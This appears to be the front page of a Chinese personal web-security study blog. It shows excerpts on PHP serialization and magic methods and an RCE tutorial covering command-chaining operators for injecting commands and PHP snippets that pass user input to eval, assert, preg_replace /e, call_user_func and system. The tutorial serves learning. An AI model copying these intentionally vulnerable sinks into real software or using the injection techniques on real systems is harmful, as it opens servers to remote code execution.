1234$sites = array(&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Facebook&#x27;);$serialized_data = serialize($sites);echo  $serialized_data;//a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;

​		可进行序列化的对象：



类型
结构



String
s:长度:”值”;


Integer
i:值;


Boolean
b:值(1或0);


Null
N;


Array
a:长度:{……}


Object
O:类名长度:”类名”:类中变量个数:{……}


​		Object 类型序列化：
123456789101112131415&lt;?phpclass student&#123;    public $name=&quot;Tom&quot;;    protected $age=18;    private $sex=&quot;male&quot;;    public function hello() &#123;        echo &quot;hello&quot;;    &#125;&#125;$class = new student();$serialize = serialize($class);echo $serialize;?&gt;//O:7:&quot;student&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:6:&quot;*age&quot;;i:18;s:12:&quot;studentsex&quot;;s:4:&quot;male&quot;;&#125;//注意变量对应的访问修饰符，public正常，private是%00类名%00属性名，protected是%00*%00属性名

unserialize()​		将通过 serialize() 函数序列化后的对象或数组进行反序列化，返回序列化前的内容。如果传递的字符串不可反序列化，则返回 FALSE，并产生一个 E_NOTICE。示例：
1234567891011$str = &#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;;$unserialized_data = unserialize($str);print_r($unserialized_data);/*Array(    [0] =&gt; Google    [1] =&gt; Runoob    [2] =&gt; Facebook)*/

魔术方法__construct()​		构造方法。
12345678910111213141516171819202122&lt;?phpclass student&#123;    public $name, $age, $sex;    public function __construct($name, $age, $sex)&#123;        $this-&gt;name = $name;        $this-&gt;age = $age;        $this-&gt;sex = $sex;        $this-&gt;whoami();    &#125;    public function whoami()&#123;        echo $this-&gt;name.&quot;\n&quot;;        echo $this-&gt;age.&quot;\n&quot;;        echo $this-&gt;sex;    &#125;&#125;$student = new student(&quot;Tom&quot;, &quot;18&quot;, &quot;male&quot;);?&gt;/*Tom18male*/

 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/12/17/RCE/" title="RCE漏洞学习">RCE漏洞学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-16T16:00:00.000Z" title="发表于 2023-12-17 00:00:00">2023-12-17</time></span></div><div class="content">简介​		RCE，Remote Command&#x2F;Code Execute，远程命令&#x2F;代码执行。
命令拼接符
注意，通过 url 传入命令时，拼接符需要进行 url 编码。

Windows命令1 || 命令2​		命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。
命令1 | 命令2​		命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。
命令1 &amp;&amp; 命令2​		命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。
命令1 &amp; 命令2​		命令 1、2 一起执行，互不影响。
Linux命令1 ; 命令2​		命令 1、2 依次执行，互不影响。
命令1 | 命令2​		管道符，命令 1 的执行结果做为命令 2 的输入。
​		命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。
命令1 || 命令2​		命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。
命令1 &amp;&amp; 命令2​		命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。
函数PHPeval()​		把字符串按照 PHP 代码来执行。
1234eval(phpinfo()); //可以eval(phpinfo();); //报错eval(&quot;phpinfo();&quot;); //可以eval(&quot;phpinfo()&quot;); //报错

12345//?cmd=phpinfo(); 分号必须有&lt;?php	$cmd = $_GET[&quot;cmd&quot;];	eval($cmd); //此处及其他类似这样的变量用法，PHP会自动在变量的替代内容外包裹引号?&gt;

assert()​		如果是字符串将会被当作 PHP 代码执行。
1234assert(phpinfo()); //可以assert(phpinfo();); //报错assert(&quot;phpinfo()&quot;); //可以assert(&quot;phpinfo();&quot;); //可以

12345//?cmd=phpinfo(); 分号可有可无&lt;?php	$cmd = $_GET[&quot;cmd&quot;];	assert($cmd);?&gt;

preg_replace()1preg_replace($pattern, $replacement, $subject);

​		执行一个正则表达式的搜索和替换。
​		$pattern 为正则表达式，$subject 为目标字符串，将匹配到的部分用 $replacement 替换。
​		当 $pattern 处出现 /e 修正符，$replacement 会被当作 PHP 代码执行。
1234//?cmd=phpinfo(); 分号可有可无&lt;?php	preg_replace(&quot;/test/e&quot;, $_GET[&quot;cmd&quot;], &quot;jutst test&quot;);?&gt;

call_user_func()1call_user_func(函数a, xxx)

​		调用函数 a ，xxx 为函数 a 的参数。
​		经测试，只有 assert 可以，eval 不行。
1234//?cmd=phpinfo(); 分号可有可无&lt;?php	call_user_func(assert, $_GET[&quot;cmd&quot;]);?&gt;

system() 和 passthru()​		执行操作系统命令，仅当执行成功时输出执行结果。
1234system/passthru(&quot;命令&quot;); //标准写法system/passthru(命令); //可以，但会抛出错误(system/passthru)(&quot;命令&quot;); //可以，但会抛出错误(system/passthru)(命令); //可以，但会抛出错误

12345//?cmd=ver 不要在命令两边加引号，否则无法执行&lt;?php	$cmd = $_GET[&quot;cmd&quot;];	syst ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mars1y</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Mars1y" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:820338868@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome, my friend!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含漏洞学习">文件包含漏洞学习</a><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/25/MD5%E7%BB%95%E8%BF%87%E4%B8%8ESHA-1%E7%BB%95%E8%BF%87/" title="MD5绕过与SHA-1绕过">MD5绕过与SHA-1绕过</a><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/25/%E6%95%A3%E5%88%97%E7%A2%B0%E6%92%9E/" title="散列碰撞">散列碰撞</a><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/25/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入学习">SQL注入学习</a><time datetime="2024-02-24T16:00:00.000Z" title="发表于 2024-02-25 00:00:00">2024-02-25</time></div></div></div></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">11</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-25T10:59:37.560Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mars1y</div><div class="footer_custom_text">To be continued.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>window.typedJSFn = {
  init: (str) => {
    window.typed = new Typed('#subtitle', Object.assign({
      strings: str,
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50,
    }, null))
  },
  run: (subtitleType) => {
    if (true) {
      if (typeof Typed === 'function') {
        subtitleType()
      } else {
        getScript('https://cdn.jsdelivr.net/npm/typed.js/dist/typed.umd.min.js').then(subtitleType)
      }
    } else {
      subtitleType()
    }
  }
}
</script><script>function subtitleType () {
  if (true) {
    typedJSFn.init(["尔要试试我的宝剑是否锋利吗？","我剑也未尝不利！"])
  } else {
    document.getElementById("subtitle").textContent = "尔要试试我的宝剑是否锋利吗？"
  }
}
typedJSFn.run(subtitleType)</script></div><script src="/js/yituliu.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>